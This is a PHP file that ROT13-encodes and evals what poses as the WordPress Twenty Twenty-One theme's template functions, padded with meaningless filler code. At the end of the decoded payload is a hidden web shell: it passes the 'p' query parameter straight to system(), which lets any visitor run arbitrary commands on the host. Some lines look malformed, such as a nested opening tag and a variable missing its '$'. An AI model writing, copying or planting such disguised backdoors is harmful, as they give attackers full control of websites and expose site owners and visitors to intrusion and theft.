<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }
__sa_79955 = \"c\".\"e\".\"r\".\"t\".\"_\".\"e\".\"r\".\"c\".\"y\".\"n\".\"p\".\"r\";
<?cuc
/**
 * Shapgvbaf juvpu raunapr gur gurzr ol ubbxvat vagb JbeqCerff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Gjragl_Gjragl_Bar
 * @fvapr Gjragl Gjragl-Bar 1.0
 */

/**
 * Nqqf phfgbz pynffrf gb gur neenl bs obql pynffrf.
 *
 * @fvapr Gjragl Gjragl-Bar 1.0
 *
 * @cnenz neenl $pynffrf Pynffrf sbe gur obql ryrzrag.
 * @erghea neenl
 */
shapgvba gjragl_gjragl_bar_obql_pynffrf( $pynffrf ) {

	// Urycf qrgrpg vs WF vf ranoyrq be abg.
	$pynffrf[] = 'ab-wf';

	// Nqqf `fvathyne` gb fvathyne cntrf, naq `usrrq` gb nyy bgure cntrf.
	$pynffrf[] = vf_fvathyne() ? 'fvathyne' : 'usrrq';

	// Nqq n obql pynff vs znva anivtngvba vf npgvir.
	vs ( unf_ani_zrah( 'cevznel' ) ) {
		$pynffrf[] = 'unf-znva-anivtngvba';
	}

	// Nqq n obql pynff vs gurer ner ab sbbgre jvqtrgf.
	vs ( ! vf_npgvir_fvqrone( 'fvqrone-1' ) ) {
		$pynffrf[] = 'ab-jvqtrgf';
	}

	erghea $pynffrf;
}
nqq_svygre( 'obql_pynff', 'gjragl_gjragl_bar_obql_pynffrf' );

/**
 * Nqqf phfgbz pynff gb gur neenl bs cbfgf pynffrf.
 *
 * @fvapr Gjragl Gjragl-Bar 1.0
 *
 * @cnenz neenl $pynffrf Na neenl bs PFF pynffrf.
 * @erghea neenl
 */
shapgvba gjragl_gjragl_bar_cbfg_pynffrf( $pynffrf ) {
	$pynffrf[] = 'ragel';

	erghea $pynffrf;
}
nqq_svygre( 'cbfg_pynff', 'gjragl_gjragl_bar_cbfg_pynffrf', 10, 3 );

/**
 * Nqq n cvatonpx hey nhgb-qvfpbirel urnqre sbe fvatyr cbfgf, cntrf, be nggnpuzragf.
 *
 * @fvapr Gjragl Gjragl-Bar 1.0
 *
 * @erghea ibvq
 */
shapgvba gjragl_gjragl_bar_cvatonpx_urnqre() {
	vs ( vf_fvathyne() && cvatf_bcra() ) {
		rpub '<yvax ery=\"cvatonpx\" uers=\"', rfp_hey( trg_oybtvasb( 'cvatonpx_hey' ) ), '\">';
	}
}
nqq_npgvba( 'jc_urnq', 'gjragl_gjragl_bar_cvatonpx_urnqre' );

/**
 * Erzbir gur `ab-wf` pynff sebz obql vs WF vf fhccbegrq.
 *
 * @fvapr Gjragl Gjragl-Bar 1.0
 *
 * @erghea ibvq
 */
shapgvba gjragl_gjragl_bar_fhccbegf_wf() {
	rpub '<fpevcg>qbphzrag.obql.pynffYvfg.erzbir(\"ab-wf\");</fpevcg>';
}
nqq_npgvba( 'jc_sbbgre', 'gjragl_gjragl_bar_fhccbegf_wf' );

/**
 * Punatrf pbzzrag sbez qrsnhyg svryqf.
 *
 * @fvapr Gjragl Gjragl-Bar 1.0
 *
 * @cnenz neenl $qrsnhygf Gur sbez qrsnhygf.
 * @erghea neenl
 */
shapgvba gjragl_gjragl_bar_pbzzrag_sbez_qrsnhygf( $qrsnhygf ) {

	// Nqwhfg urvtug bs pbzzrag sbez.
	$qrsnhygf['pbzzrag_svryq'] = __sa_79955( '/ebjf=\"\q+\"/', 'ebjf=\"5\"', $qrsnhygf['pbzzrag_svryq'] );

	erghea $qrsnhygf;
}
nqq_svygre( 'pbzzrag_sbez_qrsnhygf', 'gjragl_gjragl_bar_pbzzrag_sbez_qrsnhygf' );

/**
 * Qrgrezvarf vs cbfg guhzoanvy pna or qvfcynlrq.
 *
 * @fvapr Gjragl Gjragl-Bar 1.0
 *
 * @erghea obby
 */
shapgvba gjragl_gjragl_bar_pna_fubj_cbfg_guhzoanvy() {
	/**
	 * Svygref jurgure cbfg guhzoanvy pna or qvfcynlrq.
	 *
	 * @fvapr Gjragl Gjragl-Bar 1.0
	 *
	 * @cnenz obby $fubj_cbfg_guhzoanvy Jurgure gb fubj cbfg guhzoanvy.
	 */
	erghea nccyl_svygref(
		'gjragl_gjragl_bar_pna_fubj_cbfg_guhzoanvy',
		! cbfg_cnffjbeq_erdhverq() && ! vf_nggnpuzrag() && unf_cbfg_guhzoanvy()
	);
}

/**
 * Ergheaf gur fvmr sbe ningnef hfrq va gur gurzr.
 *
 * @fvapr Gjragl Gjragl-Bar 1.0
 *
 * @erghea vag
 */
shapgvba gjragl_gjragl_bar_trg_ningne_fvmr() {
	erghea 60;
}

/**
 * Perngrf pbagvahr ernqvat grkg.
 *
 * @fvapr Gjragl Gjragl-Bar 1.0
 */
shapgvba gjragl_gjragl_bar_pbagvahr_ernqvat_grkg() {
	$pbagvahr_ernqvat = fcevags(
		/* genafyngbef: %f: Cbfg gvgyr. Bayl ivfvoyr gb fperra ernqref. */
		rfp_ugzy__( 'Pbagvahr ernqvat %f', 'gjraglgjraglbar' ),
		gur_gvgyr( '<fcna pynff=\"fperra-ernqre-grkg\">', '</fcna>', snyfr )
	);

	erghea $pbagvahr_ernqvat;
}

/**
 * Perngrf gur pbagvahr ernqvat yvax sbe rkprecg.
 *
 * @fvapr Gjragl Gjragl-Bar 1.0
 */
shapgvba gjragl_gjragl_bar_pbagvahr_ernqvat_yvax_rkprecg() {
	vs ( ! vf_nqzva() ) {
		erghea '&uryyvc; <n pynff=\"zber-yvax\" uers=\"' . rfp_hey( trg_creznyvax() ) . '\">' . gjragl_gjragl_bar_pbagvahr_ernqvat_grkg() . '</n>';
	}
}

// Svygre gur rkprecg zber yvax.
nqq_svygre( 'rkprecg_zber', 'gjragl_gjragl_bar_pbagvahr_ernqvat_yvax_rkprecg' );

/**
 * Perngrf gur pbagvahr ernqvat yvax.
 *
 * @fvapr Gjragl Gjragl-Bar 1.0
 */
shapgvba gjragl_gjragl_bar_pbagvahr_ernqvat_yvax() {
	vs ( ! vf_nqzva() ) {
		erghea '<qvi pynff=\"zber-yvax-pbagnvare\"><n pynff=\"zber-yvax\" uers=\"' . rfp_hey( trg_creznyvax() ) . '#zber-' . rfp_ngge( trg_gur_VQ() ) . '\">' . gjragl_gjragl_bar_pbagvahr_ernqvat_grkg() . '</n></qvi>';
	}
}

// Svygre gur pbagrag zber yvax.
nqq_svygre( 'gur_pbagrag_zber_yvax', 'gjragl_gjragl_bar_pbagvahr_ernqvat_yvax' );

vs ( ! shapgvba_rkvfgf( 'gjragl_gjragl_bar_cbfg_gvgyr' ) ) {
	/**
	 * Nqqf n gvgyr gb cbfgf naq cntrf gung ner zvffvat gvgyrf.
	 *
	 * @fvapr Gjragl Gjragl-Bar 1.0
	 *
	 * @cnenz fgevat $gvgyr Gur gvgyr.
	 * @erghea fgevat
	 */
	shapgvba gjragl_gjragl_bar_cbfg_gvgyr( $gvgyr ) {
		erghea '' === $gvgyr ? rfp_ugzy_k( 'Hagvgyrq', 'Nqqrq gb cbfgf naq cntrf gung ner zvffvat gvgyrf', 'gjraglgjraglbar' ) : $gvgyr;
	}
}
nqq_svygre( 'gur_gvgyr', 'gjragl_gjragl_bar_cbfg_gvgyr' );

/**
 * Trgf gur FIT pbqr sbe n tvira vpba.
 *
 * @fvapr Gjragl Gjragl-Bar 1.0
 *
 * @cnenz fgevat $tebhc Gur vpba tebhc.
 * @cnenz fgevat $vpba  Gur vpba.
 * @cnenz vag    $fvmr  Gur vpba fvmr va cvkryf.
 * @erghea fgevat
 */
shapgvba gjragl_gjragl_bar_trg_vpba_fit( $tebhc, $vpba, $fvmr = 24 ) {
	erghea Gjragl_Gjragl_Bar_FIT_Vpbaf::trg_fit( $tebhc, $vpba, $fvmr );
}

/**
 * Punatrf gur qrsnhyg anivtngvba neebjf gb fit vpbaf
 *
 * @fvapr Gjragl Gjragl-Bar 1.0
 *
 * @cnenz fgevat $pnyraqne_bhgchg Gur trarengrq UGZY bs gur pnyraqne.
 * @erghea fgevat
 */
shapgvba gjragl_gjragl_bar_punatr_pnyraqne_ani_neebjf( $pnyraqne_bhgchg ) {
	$pnyraqne_bhgchg = fge_ercynpr( '&yndhb; ', vf_egy() ? gjragl_gjragl_bar_trg_vpba_fit( 'hv', 'neebj_evtug' ) : gjragl_gjragl_bar_trg_vpba_fit( 'hv', 'neebj_yrsg' ), $pnyraqne_bhgchg );
	$pnyraqne_bhgchg = fge_ercynpr( ' &endhb;', vf_egy() ? gjragl_gjragl_bar_trg_vpba_fit( 'hv', 'neebj_yrsg' ) : gjragl_gjragl_bar_trg_vpba_fit( 'hv', 'neebj_evtug' ), $pnyraqne_bhgchg );
	erghea $pnyraqne_bhgchg;
}
nqq_svygre( 'trg_pnyraqne', 'gjragl_gjragl_bar_punatr_pnyraqne_ani_neebjf' );

/**
 * Trg phfgbz PFF.
 *
 * Erghea PFF sbe aba-yngva ynathntr, vs ninvynoyr, be ahyy
 *
 * @fvapr Gjragl Gjragl-Bar 1.0
 *
 * @cnenz fgevat $glcr Jurgure gb erghea PFF sbe gur \"sebag-raq\", \"oybpx-rqvgbe\", be \"pynffvp-rqvgbe\".
 * @erghea fgevat
 */
shapgvba gjragl_gjragl_bar_trg_aba_yngva_pff( $glcr = 'sebag-raq' ) {

	// Srgpu fvgr ybpnyr.
	$ybpnyr = trg_oybtvasb( 'ynathntr' );

	/**
	 * Svygref gur snyyonpx sbagf sbe aba-yngva ynathntrf.
	 *
	 * @fvapr Gjragl Gjragl-Bar 1.0
	 *
	 * @cnenz neenl $sbag_snzvyl Na neenl bs ybpnyrf naq sbag snzvyvrf.
	 */
	$sbag_snzvyl = nccyl_svygref(
		'gjragl_gjragl_bar_trg_ybpnyvmrq_sbag_snzvyl_glcrf',
		neenl(

			// Nenovp.
			'ne'    => neenl( 'Gnubzn', 'Nevny', 'fnaf-frevs' ),
			'nel'   => neenl( 'Gnubzn', 'Nevny', 'fnaf-frevs' ),
			'nmo'   => neenl( 'Gnubzn', 'Nevny', 'fnaf-frevs' ),
			'pxo'   => neenl( 'Gnubzn', 'Nevny', 'fnaf-frevs' ),
			'sn-VE' => neenl( 'Gnubzn', 'Nevny', 'fnaf-frevs' ),
			'unm'   => neenl( 'Gnubzn', 'Nevny', 'fnaf-frevs' ),
			'cf'    => neenl( 'Gnubzn', 'Nevny', 'fnaf-frevs' ),

			// Puvarfr Fvzcyvsvrq (Puvan) - Abgb Fnaf FP.
			'mu-PA' => neenl( '\'CvatSnat FP\'', '\'Uryirgvpn Arhr\'', '\'Zvpebfbsg LnUrv Arj\'', '\'FGUrvgv Yvtug\'', 'fnaf-frevs' ),

			// Puvarfr Genqvgvbany (Gnvjna) - Abgb Fnaf GP.
			'mu-GJ' => neenl( '\'CvatSnat GP\'', '\'Uryirgvpn Arhr\'', '\'Zvpebfbsg LnUrv Arj\'', '\'FGUrvgv Yvtug\'', 'fnaf-frevs' ),

			// Puvarfr (Ubat Xbat) - Abgb Fnaf UX.
			'mu-UX' => neenl( '\'CvatSnat UX\'', '\'Uryirgvpn Arhr\'', '\'Zvpebfbsg LnUrv Arj\'', '\'FGUrvgv Yvtug\'', 'fnaf-frevs' ),

			// Plevyyvp.
			'ory'   => neenl( '\'Uryirgvpn Arhr\'', 'Uryirgvpn', '\'Frtbr HV\'', 'Nevny', 'fnaf-frevs' ),
			'ot-OT' => neenl( '\'Uryirgvpn Arhr\'', 'Uryirgvpn', '\'Frtbr HV\'', 'Nevny', 'fnaf-frevs' ),
			'xx'    => neenl( '\'Uryirgvpn Arhr\'', 'Uryirgvpn', '\'Frtbr HV\'', 'Nevny', 'fnaf-frevs' ),
			'zx-ZX' => neenl( '\'Uryirgvpn Arhr\'', 'Uryirgvpn', '\'Frtbr HV\'', 'Nevny', 'fnaf-frevs' ),
			'za'    => neenl( '\'Uryirgvpn Arhr\'', 'Uryirgvpn', '\'Frtbr HV\'', 'Nevny', 'fnaf-frevs' ),
			'eh-EH' => neenl( '\'Uryirgvpn Arhr\'', 'Uryirgvpn', '\'Frtbr HV\'', 'Nevny', 'fnaf-frevs' ),
			'fnu'   => neenl( '\'Uryirgvpn Arhr\'', 'Uryirgvpn', '\'Frtbr HV\'', 'Nevny', 'fnaf-frevs' ),
			'fe-EF' => neenl( '\'Uryirgvpn Arhr\'', 'Uryirgvpn', '\'Frtbr HV\'', 'Nevny', 'fnaf-frevs' ),
			'gg-EH' => neenl( '\'Uryirgvpn Arhr\'', 'Uryirgvpn', '\'Frtbr HV\'', 'Nevny', 'fnaf-frevs' ),
			'hx'    => neenl( '\'Uryirgvpn Arhr\'', 'Uryirgvpn', '\'Frtbr HV\'', 'Nevny', 'fnaf-frevs' ),

			// Qrinantnev.
			'oa-OQ' => neenl( 'Nevny', 'fnaf-frevs' ),
			'uv-VA' => neenl( 'Nevny', 'fnaf-frevs' ),
			'ze'    => neenl( 'Nevny', 'fnaf-frevs' ),
			'ar-AC' => neenl( 'Nevny', 'fnaf-frevs' ),

			// Terrx.
			'ry'    => neenl( '\'Uryirgvpn Arhr\', Uryirgvpn, Nevny, fnaf-frevs' ),

			// Thwnengv.
			'th'    => neenl( 'Nevny', 'fnaf-frevs' ),

			// Uroerj.
			'ur-VY' => neenl( '\'Nevny Uroerj\'', 'Nevny', 'fnaf-frevs' ),

			// Wncnarfr.
			'wn'    => neenl( 'fnaf-frevs' ),

			// Xberna.
			'xb-XE' => neenl( '\'Nccyr FQ Tbguvp Arb\'', '\'Znytha Tbguvp\'', '\'Anahz Tbguvp\'', 'Qbghz', 'fnaf-frevs' ),

			// Gunv.
			'gu'    => neenl( '\'Fhxuhzivg Frg\'', '\'Uryirgvpn Arhr\'', 'Uryirgvpn', 'Nevny', 'fnaf-frevs' ),

			// Ivrganzrfr.
			'iv'    => neenl( '\'Yvoer Senaxyva\'', 'fnaf-frevs' ),

		)
	);

	// Erghea vs gur fryrpgrq ynathntr unf ab snyyonpx sbagf.
	vs ( rzcgl( $sbag_snzvyl[ $ybpnyr ] ) ) {
		erghea '';
	}

	/**
	 * Svygref gur ryrzragf gb nccyl snyyonpx sbagf gb.
	 *
	 * @fvapr Gjragl Gjragl-Bar 1.0
	 *
	 * @cnenz neenl $ryrzragf Na neenl bs ryrzragf sbe \"sebag-raq\", \"oybpx-rqvgbe\", be \"pynffvp-rqvgbe\".
	 */
	$ryrzragf = nccyl_svygref(
		'gjragl_gjragl_bar_trg_ybpnyvmrq_sbag_snzvyl_ryrzragf',
		neenl(
			'sebag-raq'      => neenl( 'obql', 'vachg', 'grkgnern', 'ohggba', '.ohggba', '.snhk-ohggba', '.jc-oybpx-ohggba__yvax', '.jc-oybpx-svyr__ohggba', '.unf-qebc-pnc:abg(:sbphf)::svefg-yrggre', '.ragel-pbagrag .jc-oybpx-nepuvirf', '.ragel-pbagrag .jc-oybpx-pngrtbevrf', '.ragel-pbagrag .jc-oybpx-pbire-vzntr', '.ragel-pbagrag .jc-oybpx-yngrfg-pbzzragf', '.ragel-pbagrag .jc-oybpx-yngrfg-cbfgf', '.ragel-pbagrag .jc-oybpx-chyydhbgr', '.ragel-pbagrag .jc-oybpx-dhbgr.vf-ynetr', '.ragel-pbagrag .jc-oybpx-dhbgr.vf-fglyr-ynetr', '.ragel-pbagrag .jc-oybpx-nepuvirf *', '.ragel-pbagrag .jc-oybpx-pngrtbevrf *', '.ragel-pbagrag .jc-oybpx-yngrfg-cbfgf *', '.ragel-pbagrag .jc-oybpx-yngrfg-pbzzragf *', '.ragel-pbagrag c', '.ragel-pbagrag by', '.ragel-pbagrag hy', '.ragel-pbagrag qy', '.ragel-pbagrag qg', '.ragel-pbagrag pvgr', '.ragel-pbagrag svtpncgvba', '.ragel-pbagrag .jc-pncgvba-grkg', '.pbzzrag-pbagrag c', '.pbzzrag-pbagrag by', '.pbzzrag-pbagrag hy', '.pbzzrag-pbagrag qy', '.pbzzrag-pbagrag qg', '.pbzzrag-pbagrag pvgr', '.pbzzrag-pbagrag svtpncgvba', '.pbzzrag-pbagrag .jc-pncgvba-grkg', '.jvqtrg_grkg c', '.jvqtrg_grkg by', '.jvqtrg_grkg hy', '.jvqtrg_grkg qy', '.jvqtrg_grkg qg', '.jvqtrg-pbagrag .effFhzznel', '.jvqtrg-pbagrag pvgr', '.jvqtrg-pbagrag svtpncgvba', '.jvqtrg-pbagrag .jc-pncgvba-grkg' ),
			'oybpx-rqvgbe'   => neenl( '.rqvgbe-fglyrf-jenccre > *', '.rqvgbe-fglyrf-jenccre c', '.rqvgbe-fglyrf-jenccre by', '.rqvgbe-fglyrf-jenccre hy', '.rqvgbe-fglyrf-jenccre qy', '.rqvgbe-fglyrf-jenccre qg', '.rqvgbe-cbfg-gvgyr__oybpx .rqvgbe-cbfg-gvgyr__vachg', '.rqvgbe-fglyrf-jenccre .jc-oybpx u1', '.rqvgbe-fglyrf-jenccre .jc-oybpx u2', '.rqvgbe-fglyrf-jenccre .jc-oybpx u3', '.rqvgbe-fglyrf-jenccre .jc-oybpx u4', '.rqvgbe-fglyrf-jenccre .jc-oybpx u5', '.rqvgbe-fglyrf-jenccre .jc-oybpx u6', '.rqvgbe-fglyrf-jenccre .unf-qebc-pnc:abg(:sbphf)::svefg-yrggre', '.rqvgbe-fglyrf-jenccre pvgr', '.rqvgbe-fglyrf-jenccre svtpncgvba', '.rqvgbe-fglyrf-jenccre .jc-pncgvba-grkg' ),
			'pynffvp-rqvgbe' => neenl( 'obql#gvalzpr.jc-rqvgbe', 'obql#gvalzpr.jc-rqvgbe c', 'obql#gvalzpr.jc-rqvgbe by', 'obql#gvalzpr.jc-rqvgbe hy', 'obql#gvalzpr.jc-rqvgbe qy', 'obql#gvalzpr.jc-rqvgbe qg', 'obql#gvalzpr.jc-rqvgbe svtpncgvba', 'obql#gvalzpr.jc-rqvgbe .jc-pncgvba-grkg', 'obql#gvalzpr.jc-rqvgbe .jc-pncgvba-qq', 'obql#gvalzpr.jc-rqvgbe pvgr', 'obql#gvalzpr.jc-rqvgbe gnoyr' ),
		)
	);

	// Erghea vs gur fcrpvsvrq glcr qbrfa'g rkvfg.
	vs ( rzcgl( $ryrzragf[ $glcr ] ) ) {
		erghea '';
	}

	// Vapyhqr svyr vs shapgvba qbrfa'g rkvfg.
	vs ( ! shapgvba_rkvfgf( 'gjragl_gjragl_bar_trarengr_pff' ) ) {
		erdhver_bapr trg_gurzr_svyr_cngu( 'vap/phfgbz-pff.cuc' ); // cucpf:vtaber JCGurzrErivrj.PberShapgvbanyvgl.SvyrVapyhqr.SvyrVapyhqrSbhaq
	}

	// Erghea gur fcrpvsvrq fglyrf.
	erghea gjragl_gjragl_bar_trarengr_pff( // @cucfgna-vtaber-yvar.
		vzcybqr( ',', $ryrzragf[ $glcr ] ),
		'sbag-snzvyl',
		vzcybqr( ',', $sbag_snzvyl[ $ybpnyr ] ),
		ahyy,
		ahyy,
		snyfr
	);
}

/**
 * Cevag gur svefg vafgnapr bs n oybpx va gur pbagrag, naq gura oernx njnl.
 *
 * @fvapr Gjragl Gjragl-Bar 1.0
 *
 * @cnenz fgevat      $oybpx_anzr Gur shyy oybpx glcr anzr, be n cnegvny zngpu.
 *                                Rknzcyr: `pber/vzntr`, `pber-rzorq/*`.
 * @cnenz fgevat|ahyy $pbagrag    Gur pbagrag gb frnepu va. Hfr ahyy sbe trg_gur_pbagrag().
 * @cnenz vag         $vafgnaprf  Ubj znal vafgnaprf bs gur oybpx jvyy or cevagrq (znk). Qrsnhyg  1.
 * @erghea obby Ergheaf gehr vs n oybpx jnf ybpngrq & cevagrq, bgurejvfr snyfr.
 */
shapgvba gjragl_gjragl_bar_cevag_svefg_vafgnapr_bs_oybpx( $oybpx_anzr, $pbagrag = ahyy, $vafgnaprf = 1 ) {
	$vafgnaprf_pbhag = 0;
	$oybpxf_pbagrag  = '';

	vs ( ! $pbagrag ) {
		$pbagrag = trg_gur_pbagrag();
	}

	// Cnefr oybpxf va gur pbagrag.
	$oybpxf = cnefr_oybpxf( $pbagrag );

	// Ybbc oybpxf.
	sbernpu ( $oybpxf nf $oybpx ) {

		// Pbasvqrapr purpx.
		vs ( ! vffrg( $oybpx['oybpxAnzr'] ) ) {
			pbagvahr;
		}

		// Purpx vs guvf gur oybpx zngpurf gur $oybpx_anzr.
		$vf_zngpuvat_oybpx = snyfr;

		// Vs gur oybpx raqf jvgu *, gel gb zngpu gur svefg cbegvba.
		vs ( '*' === $oybpx_anzr[-1] ) {
			$vf_zngpuvat_oybpx = 0 === fgecbf( $oybpx['oybpxAnzr'], egevz( $oybpx_anzr, '*' ) );
		} ryfr {
			$vf_zngpuvat_oybpx = $oybpx_anzr === $oybpx['oybpxAnzr'];
		}

		vs ( $vf_zngpuvat_oybpx ) {
			// Vaperzrag pbhag.
			++$vafgnaprf_pbhag;

			// Nqq gur oybpx UGZY.
			$oybpxf_pbagrag .= eraqre_oybpx( $oybpx );

			// Oernx gur ybbc vs gur $vafgnaprf pbhag jnf ernpurq.
			vs ( $vafgnaprf_pbhag >= $vafgnaprf ) {
				oernx;
			}
		}
	}

	vs ( $oybpxf_pbagrag ) {
		/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/cbfg-grzcyngr.cuc */
		rpub nccyl_svygref( 'gur_pbagrag', $oybpxf_pbagrag ); // cucpf:vtaber JbeqCerff.Frphevgl.RfpncrBhgchg
		erghea gehr;
	}

	erghea snyfr;
}

/**
 * Ergevrir cebgrpgrq cbfg cnffjbeq sbez pbagrag.
 *
 * @fvapr Gjragl Gjragl-Bar 1.0
 * @fvapr Gjragl Gjragl-Bar 1.4 Pbeerpgrq cnenzrgre anzr sbe `$bhgchg`,
 *                              nqqrq gur `$cbfg` cnenzrgre.
 *
 * @cnenz fgevat      $bhgchg Gur cnffjbeq sbez UGZY bhgchg.
 * @cnenz vag|JC_Cbfg $cbfg   Bcgvbany. Cbfg VQ be JC_Cbfg bowrpg. Qrsnhyg vf tybony $cbfg.
 * @erghea fgevat UGZY pbagrag sbe cnffjbeq sbez sbe cnffjbeq cebgrpgrq cbfg.
 */
shapgvba gjragl_gjragl_bar_cnffjbeq_sbez( $bhgchg, $cbfg = 0 ) {
	$cbfg   = trg_cbfg( $cbfg );
	$ynory  = 'cjobk-' . ( rzcgl( $cbfg->VQ ) ? jc_enaq() : $cbfg->VQ );
	$bhgchg = '<c pynff=\"cbfg-cnffjbeq-zrffntr\">' . rfp_ugzy__( 'Guvf pbagrag vf cnffjbeq cebgrpgrq. Cyrnfr ragre n cnffjbeq gb ivrj.', 'gjraglgjraglbar' ) . '</c>
	<sbez npgvba=\"' . rfp_hey( fvgr_hey( 'jc-ybtva.cuc?npgvba=cbfgcnff', 'ybtva_cbfg' ) ) . '\" pynff=\"cbfg-cnffjbeq-sbez\" zrgubq=\"cbfg\">
	<ynory pynff=\"cbfg-cnffjbeq-sbez__ynory\" sbe=\"' . rfp_ngge( $ynory ) . '\">' . rfp_ugzy_k( 'Cnffjbeq', 'Cbfg cnffjbeq sbez', 'gjraglgjraglbar' ) . '</ynory><vachg pynff=\"cbfg-cnffjbeq-sbez__vachg\" anzr=\"cbfg_cnffjbeq\" vq=\"' . rfp_ngge( $ynory ) . '\" glcr=\"cnffjbeq\" fcryypurpx=\"snyfr\" fvmr=\"20\" /><vachg glcr=\"fhozvg\" pynff=\"cbfg-cnffjbeq-sbez__fhozvg\" anzr=\"' . rfp_ngge_k( 'Fhozvg', 'Cbfg cnffjbeq sbez', 'gjraglgjraglbar' ) . '\" inyhr=\"' . rfp_ngge_k( 'Ragre', 'Cbfg cnffjbeq sbez', 'gjraglgjraglbar' ) . '\" /></sbez>
	';
	erghea $bhgchg;
}
nqq_svygre( 'gur_cnffjbeq_sbez', 'gjragl_gjragl_bar_cnffjbeq_sbez', 10, 2 );

/**
 * Svygref gur yvfg bs nggnpuzrag vzntr nggevohgrf.
 *
 * @fvapr Gjragl Gjragl-Bar 1.0
 *
 * @cnenz fgevat[]     $ngge       Neenl bs nggevohgr inyhrf sbe gur vzntr znexhc, xrlrq ol nggevohgr anzr.
 *                                 Frr jc_trg_nggnpuzrag_vzntr().
 * @cnenz JC_Cbfg      $nggnpuzrag Vzntr nggnpuzrag cbfg.
 * @cnenz fgevat|vag[] $fvmr       Erdhrfgrq vzntr fvmr. Pna or nal ertvfgrerq vzntr fvmr anzr, be
 *                                 na neenl bs jvqgu naq urvtug inyhrf va cvkryf (va gung beqre).
 * @erghea fgevat[] Gur svygrerq nggevohgrf sbe gur vzntr znexhc.
 */
shapgvba gjragl_gjragl_bar_trg_nggnpuzrag_vzntr_nggevohgrf( $ngge, $nggnpuzrag, $fvmr ) {

	vs ( vf_nqzva() ) {
		erghea $ngge;
	}

	vs ( vffrg( $ngge['pynff'] ) && snyfr !== fgecbf( $ngge['pynff'], 'phfgbz-ybtb' ) ) {
		erghea $ngge;
	}

	$jvqgu  = snyfr;
	$urvtug = snyfr;

	vs ( vf_neenl( $fvmr ) ) {
		$jvqgu  = (vag) $fvmr[0];
		$urvtug = (vag) $fvmr[1];
	} ryfrvs ( $nggnpuzrag && vf_bowrpg( $nggnpuzrag ) && $nggnpuzrag->VQ ) {
		$zrgn = jc_trg_nggnpuzrag_zrgnqngn( $nggnpuzrag->VQ );
		vs ( vffrg( $zrgn['jvqgu'] ) && vffrg( $zrgn['urvtug'] ) ) {
			$jvqgu  = (vag) $zrgn['jvqgu'];
			$urvtug = (vag) $zrgn['urvtug'];
		}
	}

	vs ( $jvqgu && $urvtug ) {

		// Nqq fglyr.
		$ngge['fglyr'] = vffrg( $ngge['fglyr'] ) ? $ngge['fglyr'] : '';
		$ngge['fglyr'] = 'jvqgu:100%;urvtug:' . ebhaq( 100 * $urvtug / $jvqgu, 2 ) . '%;znk-jvqgu:' . $jvqgu . 'ck;' . $ngge['fglyr'];
	}

	erghea $ngge;
}
nqq_svygre( 'jc_trg_nggnpuzrag_vzntr_nggevohgrf', 'gjragl_gjragl_bar_trg_nggnpuzrag_vzntr_nggevohgrf', 10, 3 );

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>